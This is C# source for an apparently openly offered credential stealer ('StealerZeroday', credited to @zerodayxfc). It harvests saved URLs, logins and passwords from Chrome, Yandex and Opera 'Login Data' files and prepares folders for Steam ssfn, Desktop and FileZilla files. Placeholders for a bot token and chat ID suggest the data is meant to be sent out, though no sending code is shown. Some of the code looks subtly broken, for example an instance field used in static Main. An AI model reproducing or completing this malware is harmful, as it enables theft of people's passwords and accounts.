using System.Security.Cryptography;
using Ionic.Zip;
using System;
using System.IO;
using System.Security.Principal;
using System.Drawing;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.Net;

namespace StealerZeroday
{
    class Program
    {
        static string temp = Path.GetTempPath(); 
        static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");
        static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        static string username = WindowsIdentity.GetCurrent().Name; 
        static string workdir = temp + username;
        static string host = Dns.GetHostName();
        static IPAddress IP = Dns.GetHostByName(host).AddressList[0];
        static string HWID = "";
        static string Token = "токен вашего бота"; 
        static string ID = "ссылка на чат id"; 
        string text = "";
        static void Main(string[] args)
        {
            Directory.CreateDirectory(temp + username);
            Directory.CreateDirectory(workdir + "\\Steam");
            Directory.CreateDirectory(workdir + "\\Steam\\ssfn");
            Directory.CreateDirectory(workdir + "\\Desktop");
            Directory.CreateDirectory(workdir + "\\FileZilla");
            string[] dir = 
            {
                LocalAppData + @"\Google\Chrome\User Data\Default\Login Data",
                LocalAppData + @"\Yandex\YandexBrowser\User Data\Default\Login Data",
                AppData + @"\Opera Software\Opera Stable\Login Data"
            };
            foreach (string p in dir)
            {
                var pas = Passwords.ReadPass(p);
                if (File.Exists(p))
                {
                    text += "C# stealer by: @zerodayxfc\r\n\r\n";
                    foreach(var item in pas)
                    {
                        if ((item.Item2.Length > 0) && (item.Item3.Length > 0))
                        {
                            text += "URL: " + item.Item1 + "\r\n" + "Login: " + item.Item2 + "\r\n" + "Password: " + item.Item3 + "\r\n";
                            text += "\r\n";
                        }
                    }
                }
            }
        }
    }
}
